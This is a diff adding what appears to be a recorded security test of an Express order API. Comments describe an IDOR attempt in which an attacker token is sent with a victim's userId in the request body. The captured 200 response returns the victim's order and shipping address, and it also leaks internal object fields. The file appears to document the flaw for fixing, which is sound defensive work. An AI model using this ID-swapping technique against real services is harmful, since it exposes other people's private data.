@@ -1,0 +1,18 @@
+# IDOR A - read another user's orders
+# Attempted: POST /api/order/user with body userId=<victim> using ATTACKER token
+# Expected when fixed: Should return only the caller's own orders (owner from token, not body)
+
+# attacker token, body targets victim 6ab8b702b53267666193741e
+
+## Response:
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 1214
+ETag: W/"4be-40KoX8muN+hHj/w02ZuqC6CVznM"
+Date: Sun, 27 Sep 2026 06:26:11 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"success":true,"orders":[{"_id":"6ab8b703900563c7e79ef348","userId":"6ab8b702b53267666193741e","products":[{"__parentArray":[{"_id":"6ab8b703b532676661937426","name":"Secret Dog Food","quantity":1,"price":99,"size":"M"}],"__index":0,"$__parent":{"_id":"6ab8b703900563c7e79ef348","userId":"6ab8b702b53267666193741e","products":[{"_id":"6ab8b703b532676661937426","name":"Secret Dog Food","quantity":1,"price":99,"size":"M"}],"totalPrice":99,"shippingAddress":"12 Victim Lane, Secret City","paymentMethod":"COD","payment":false,"status":"Pending","date":"2026-09-27T06:26:11.664Z","createdAt":"2026-09-27T06:26:11.831Z"},"$__":{"activePaths":{"paths":{"_id":"default","name":"init","quantity":"init","price":"init","size":"init"},"states":{"default":{"_id":true},"init":{"name":true,"quantity":true,"price":true,"size":true}}}},"_doc":{"_id":"6ab8b703b532676661937426","name":"Secret Dog Food","quantity":1,"price":99,"size":"M"},"$isNew":false,"image":null,"name":"Secret Dog Food","price":99,"quantity":1,"size":"M"}],"totalPrice":99,"shippingAddress":"12 Victim Lane, Secret City","paymentMethod":"COD","payment":false,"status":"Pending","date":"2026-09-27T06:26:11.664Z","createdAt":"2026-09-27T06:26:11.831Z"}]}
